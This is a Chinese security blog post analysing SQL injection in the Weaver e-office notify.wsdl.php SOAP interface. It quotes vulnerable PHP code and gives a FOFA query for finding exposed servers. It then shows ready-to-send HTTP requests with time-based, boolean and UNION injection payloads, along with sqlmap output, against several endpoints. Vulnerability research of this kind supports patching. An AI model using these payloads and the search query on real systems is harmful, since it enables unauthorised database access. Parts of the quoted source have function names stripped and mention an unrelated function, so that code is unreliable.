---
title: "泛微e-office notify.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-notify-wsdl-sqli.html
asset_dir: assets/泛微e-office-notify.wsdl.php-sql注入漏洞
---

# 泛微e-office notify.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/11 18:23
- 789浏览
- [0评论](#comment)
- 3小时阅读

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE "泛微")E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office notify.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

直接看 notify.wsdl.php 文件业务逻辑实现

```
<?php

function GetNotifyList( $start, $limit, $search, $UserInfor )
{
    $notifyApi = new notify( $UserInfor );
    $notify_message = $notifyApi->getNotifyInfo( $limit, $start, "", $search );
    $Infor = array( );
    foreach ( $notify_message as $index => $val )
    {
        $Infor[$index]['NOTIFY_ID'] = $notify_message[$index]['NOTIFY_ID'];
        $Infor[$index]['FROM_ID'] = $notify_message[$index]['FROM_ID'];
        $Infor[$index]['FROM_NAME'] = $notify_message[$index]['FROM_NAME'];
        $Infor[$index]['SUBJECT'] = $notify_message[$index]['SUBJECT'];
        $Infor[$index]['SEND_TIME'] = $notify_message[$index]['SEND_TIME'];
        $Infor[$index]['READERS'] = $notify_message[$index]['READERS'];
        $Infor[$index]['READERS_NAME'] = ( $val['READERS'] );
        if ( ( $Infor[$index]['READERS'], $UserInfor['user_id']."," ) )
        {
            $Infor[$index]['InformationRead'] = "1";
        }
        else
        {
            $Infor[$index]['InformationRead'] = "0";
        }
        $Infor[$index]['READ_FLAG'] = $notify_message[$index]['READ_FLAG'];
        $Infor[$index]['NOTIFY_TYPE'] = $notify_message[$index]['NOTIFY_TYPE'];
        $Infor[$index]['PUBLISH_DEPT'] = $notify_message[$index]['PUBLISH_DEPT'];
        $Infor[$index]['PUBLISH_PRIV'] = $notify_message[$index]['PUBLISH_PRIV'];
        $Infor[$index]['PUBLISH_USER'] = $notify_message[$index]['PUBLISH_USER'];
    }
    return ( $Infor );
}

function GetNotifyInformation( $NotifyId, $UserInfor )
{
    $notifyApi = new notify( $UserInfor );
    $notify_update_status = $notifyApi->updateReadStatus( $NotifyId );
    $notify_message = $notifyApi->getNotifyInfo( "", "", $NotifyId, array( ) );
    foreach ( $notify_message as $index => $val )
    {
        $notify_message[$index]['READERS_NAME'] = ( $val['READERS'] );
    }
    return ( $notify_message[0] );
}

function GetNotifyType( $TypeId )
{
    $notifyApi = new notify( );
    $NotifyType = $notifyApi->GetNotifyType( $TypeId );
    return ( $NotifyType );
}

function getNotifyAmount( $search, $UserInfor )
{
    $notifyApi = new notify( $UserInfor );
    $notify_counts = $notifyApi->getNotifyAmount( $search );
    return $notify_counts;
}

function getNewNotifyAmount( $UserInfor )
{
    $notifyApi = new notify( $UserInfor );
    $notify_new_counts = $notifyApi->getNewNotifyAmount( );
    return $notify_new_counts;
}

include_once( "nusoap/lib/nusoap.php" );
include_once( "api/notify.class.php" );
include_once( "api/user.class.php" );
include_once( "inc/conn.php" );
include_once( "wap/function.php" );
include_once( "inc/checkcurrentsession.php" );
$server = new soap_server( );
$server->soap_defencoding = "UTF-8";
$server->decode_utf8 = false;
$server->configureWSDL( "notifyServicewsdl", "urn:notifyServicewsdl" );
$server->wsdl->schemaTargetNamespace = "urn:notifyServicewsdl";
$server->wsdl->addComplexType( "UserInfor", "complexType", "array", "all", "", array(
    "user_id" => array( "name" => "user_id", "type" => "xsd:string" ),
    "user_name" => array( "name" => "user_name", "type" => "xsd:string" ),
    "session_id" => array( "name" => "session_id", "type" => "xsd:string" )
) );
$server->wsdl->addComplexType( "NotifySearch", "complexType", "array", "all", "", array(
    "NotifySubject" => array( "name" => "NotifySubject", "type" => "xsd:string" ),
    "NotifySort" => array( "name" => "NotifySort", "type" => "xsd:string" ),
    "NotifyOther" => array( "name" => "NotifyOther", "type" => "xsd:string" )
) );
$server->register( "GetNotifyList", array( "start" => "xsd:string", "limit" => "xsd:string", "search" => "tns:NotifySearch", "UserInfor" => "tns:UserInfor" ), array( "return" => "xsd:string" ), "urn:notifyServicewsdl", "urn:notifyServicewsdl#GetNotifyList", "rpc", "encoded", "Get E-office notify GetNotifyList" );
$server->register( "GetNotifyInformation", array( "NotifyId" => "xsd:int", "UserInfor" => "tns:UserInfor" ), array( "return" => "xsd:string" ), "urn:notifyServicewsdl", "urn:notifyServicewsdl#GetNotifyInformation", "rpc", "encoded", "Get E-office notify GetNotifyInformation" );
$server->register( "GetNotifyType", array( "TypeId" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:notifyServicewsdl", "urn:notifyServicewsdl#GetNotifyType", "rpc", "encoded", "Get Public notify type" );
$server->register( "getNotifyAmount", array( "search" => "tns:NotifySearch", "UserInfor" => "tns:UserInfor" ), array( "return" => "xsd:string" ), "urn:notifyServicewsdl", "urn:notifyServicewsdl#getNotifyAmount", "rpc", "encoded", "Get E-office notify count" );
$server->register( "getNewNotifyAmount", array( "UserInfor" => "tns:UserInfor" ), array( "return" => "xsd:string" ), "urn:notifyServicewsdl", "urn:notifyServicewsdl#getNewNotifyAmount", "rpc", "encoded", "Get E-office notify count" );
$HTTP_RAW_POST_DATA = isset( $HTTP_RAW_POST_DATA ) ? $HTTP_RAW_POST_DATA : "";
$server->service( $HTTP_RAW_POST_DATA );
?>
```

这是一个基于 PHP 的 SOAP 服务实现，它提供以下几个功能：`getNewNotifyAmount` 、 `getNotifyAmount` 、`GetNotifyInformation`、`GetNotifyList` 和 `GetNotifyType`

直接在 `webservice-json/notify/notify.wsdl.php` 后加上 `?wsdl` 再使用 SoapUI 或者 burp 的Wsdler 插件解析即可得到HTTP请求报文

编程

[![泛微e-office notify.wsdl.php sql注入漏洞](images/img-001-c4ad1bdcd04d.webp)](https://image.mrxn.net/fb1122c8a97b4eb18f9302064af3da8d.webp)

## getNewNotifyAmount

先看 `getNewNotifyAmount` 功能实现逻辑

`$UserInfor` 直接带入 `notify` 函数，业务逻辑如下

```
public function __construct( $userinfo = array( ) )
    {
        global $connection;
        if ( $userinfo['user_id'] == "" )
        {
            $this->userid = $_SESSION['LOGIN_USER_ID'];
        }
        else
        {
            $this->userid = $userinfo['user_id'];
        }
        if ( $this->userid )
        {
            $sql = "SELECT DEPT_ID,USER_PRIV FROM user WHERE USER_ID='".$this->userid."'";
            $rs = ( $connection, $sql );
```

`$user_id` 是直接拼接进SQL语句中执行，无任何过滤，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

## getNotifyAmount

```
function getNotifyAmount( $search, $UserInfor )
{
    $notifyApi = new notify( $UserInfor );
    $notify_counts = $notifyApi->getNotifyAmount( $search );
    return $notify_counts;
}
```

`$search` 和 `$UserInfor` 分别带入 `notify` 和 `getNotifyAmount` 函数, `notiy` 函数参考上面，`getNotifyAmount` 业务逻辑如下

漏洞扫描服务

```
public function getNotifyAmount( $search = array( ) )
    {
        global $connection;
        $sql = "SELECT COUNT(NOTIFY_ID) AS CNT FROM notify WHERE PUBLIC = '1' AND OPTIONSTATE='1' AND BEGIN_DATE<='".$this->curdate."' AND ( END_DATE>='".$this->curdate."' OR END_DATE = '0000-00-00') AND( (DEPT_ID = 'ALL_DEPT') OR (INStr(DEPT_ID,',".$this->deptid.",')>0 OR INStr(DEPT_ID,'".$this->deptid.",')=1) OR (INStr(PRIV_ID,',".$this->uesrpriv.",')>0 OR  INStr(PRIV_ID,'".$this->uesrpriv.",')=1) OR (INStr(USER_ID,',".$this->userid.",')>0 OR  INStr(USER_ID,'".$this->userid.",')=1) )";
        if ( $search['NotifySubject'] != "" )
        {
            $sql .= " AND SUBJECT like '%".$search['NotifySubject']."%'";
        }
        if ( $search['NotifySort'] != "" )
        {
            $sql .= " AND NOTIFY_TYPE_ID='".$search['NotifySort']."'";
        }
        $rs = ( $connection, $sql );
        $row = ( $rs );
        $amount = $row['CNT'];
        return $amount;
    }
```

可以看到和上面的 SaveAttendance 函数注入一样也是 `$search['NotifySubject']` 、`$search['NotifySort']` 直接拼接进SQL语句中，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

## GetNotifyType

```
function GetNotifyType( $TypeId )
{
    $notifyApi = new notify( );
    $NotifyType = $notifyApi->GetNotifyType( $TypeId );
    return ( $NotifyType );
}
```

`$TypeId` 直接带入 `GetNotifyType` 函数

```
public function GetNotifyType( $TypeId = "" )
    {
        global $connection;
        $NotifyType = array( );
        if ( $TypeId == "" )
        {
            $query = "SELECT * FROM notify_type ORDER BY NOTIFY_TYPE_ID ASC";
        }
        else
        {
            $query = "SELECT * FROM notify_type WHERE NOTIFY_TYPE_ID='".$TypeId."'";
        }
        $result = ( $connection, $query );
        while ( $row = ( $result ) )
        {
            $NotifyType[] = $row;
        }
        return $NotifyType;
    }
```

最终被直接拼接进SQL语句中执行，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

GetNotifyInformation、GetNotifyList和上述处理逻辑差不就不详细列出来了。

# 漏洞复现

## getNewNotifyAmount

```
POST /webservice-json/notify/notify.wsdl.php HTTP/1.1
Accept-Encoding: gzip, deflate, br
Content-Type: text/xml;charset=UTF-8
SOAPAction: "urn:notifyServicewsdl#getNewNotifyAmount"
Content-Length: 727
Host: eoffice.mrxn.net:8082
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.4103.116 Safari/537.36
Connection: keep-alive
X-Forwarded-For: 127.0.0.1

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getNewNotifyAmount soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserInfor xsi:type="urn:UserInfor">
            <!--You may enter the following 3 items in any order-->
            <user_id xsi:type="xsd:string">1' AND (SELECT 2461 FROM (SELECT(SLEEP(5)))rwHk)#</user_id>
            <user_name xsi:type="xsd:string">admin</user_name>
            <session_id xsi:type="xsd:string">1</session_id>
         </UserInfor>
      </urn:getNewNotifyAmount>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office notify.wsdl.php sql注入漏洞](images/img-002-fb2080f09764.webp)](https://image.mrxn.net/dd3bf5cab2444831b6859420a10059f1.webp)

通过时间盲注 成功延时 5 秒。

软件

通过 [sqlmap](https://mrxn.net/tag/sqlmap) 还可测试出其他注入方式如下

```
sqlmap identified the following injection point(s) with a total of 368 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getNewNotifyAmount soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserInfor xsi:type="urn:UserInfor">
            <!--You may enter the following 3 items in any order-->
            <user_id xsi:type="xsd:string">1' RLIKE (SELECT (CASE WHEN (3318=3318) THEN 1 ELSE 0x28 END)) AND 'hSqI'='hSqI</user_id>
            <user_name xsi:type="xsd:string">admin</user_name>
            <session_id xsi:type="xsd:string">1</session_id>
         </UserInfor>
      </urn:getNewNotifyAmount>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getNewNotifyAmount soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserInfor xsi:type="urn:UserInfor">
            <!--You may enter the following 3 items in any order-->
            <user_id xsi:type="xsd:string">1' AND (SELECT 2461 FROM (SELECT(SLEEP(5)))rwHk)#</user_id>
            <user_name xsi:type="xsd:string">admin</user_name>
            <session_id xsi:type="xsd:string">1</session_id>
         </UserInfor>
      </urn:getNewNotifyAmount>
   </soapenv:Body>
</soapenv:Envelope>
---
```

## getNotifyAmount

```
POST /webservice-json/notify/notify.wsdl.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:notifyServicewsdl#getNotifyAmount
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082
Content-Length: 1178

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getNotifyAmount soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <search xsi:type="urn:NotifySearch">
            <!--type: string-->
            <NotifySubject xsi:type="xsd:string">1' AND (SELECT 2461 FROM (SELECT(SLEEP(5)))rwHk)#</NotifySubject>
            <!--type: string-->
            <NotifySort xsi:type="xsd:string">sonoras imperio</NotifySort>
            <!--type: string-->
            <NotifyOther xsi:type="xsd:string">quae divum incedo</NotifyOther>
         </search>
         <UserInfor xsi:type="urn:UserInfor">
            <!--type: string-->
            <user_id xsi:type="xsd:string">1</user_id>
            <!--type: string-->
            <user_name xsi:type="xsd:string">per auras</user_name>
            <!--type: string-->
            <session_id xsi:type="xsd:string">circum claustra</session_id>
         </UserInfor>
      </urn:getNotifyAmount>
   </soapenv:Body>
</soapenv:Envelope>
```

也是同样延时 5 秒

网络安全

[![泛微e-office notify.wsdl.php sql注入漏洞](images/img-003-a910e1ec5013.webp)](https://image.mrxn.net/a92784d8a9534db29e2d4faf19d2113a.webp)

## GetNotifyType

```
POST /webservice-json/notify/notify.wsdl.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:notifyServicewsdl#GetNotifyType
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetNotifyType soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <TypeId xsi:type="xsd:string">1' UNION ALL SELECT CONCAT(0x716a7a7071,0x53536f48427a6d70596c506644414b734d4e4e69586c4c6647646f4e51566f43575453706c516766,0x71626a6b71),NULL,NULL-- -</TypeId>
      </urn:GetNotifyType>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office notify.wsdl.php sql注入漏洞](images/img-004-42c48b52ae5f.webp)](https://image.mrxn.net/bd86255f3301471ab5c9a6a4e500edff.webp)

也是通过联合注入，在响应里回显了测试payload。

SQL注入防护

sqlmap测试结果

```
sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetNotifyType soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <TypeId xsi:type="xsd:string">1' AND 5476=5476 AND 'kRje'='kRje</TypeId>
      </urn:GetNotifyType>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetNotifyType soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <TypeId xsi:type="xsd:string">1' AND 6893=BENCHMARK(5000000,MD5(0x6f497261)) AND 'RZzC'='RZzC</TypeId>
      </urn:GetNotifyType>
   </soapenv:Body>
</soapenv:Envelope>

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetNotifyType soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <TypeId xsi:type="xsd:string">1' UNION ALL SELECT CONCAT(0x716a7a7071,0x53536f48427a6d70596c506644414b734d4e4e69586c4c6647646f4e51566f43575453706c516766,0x71626a6b71),NULL,NULL-- -</TypeId>
      </urn:GetNotifyType>
   </soapenv:Body>
</soapenv:Envelope>
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.getNewNotifyAmount](#toc-4-1-)
- [4.2.getNotifyAmount](#toc-4-2-)
- [4.3.GetNotifyType](#toc-4-3-)
- [5.漏洞复现](#toc-5-)
- [5.1.getNewNotifyAmount](#toc-5-1-)
- [5.2.getNotifyAmount](#toc-5-2-)
- [5.3.GetNotifyType](#toc-5-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
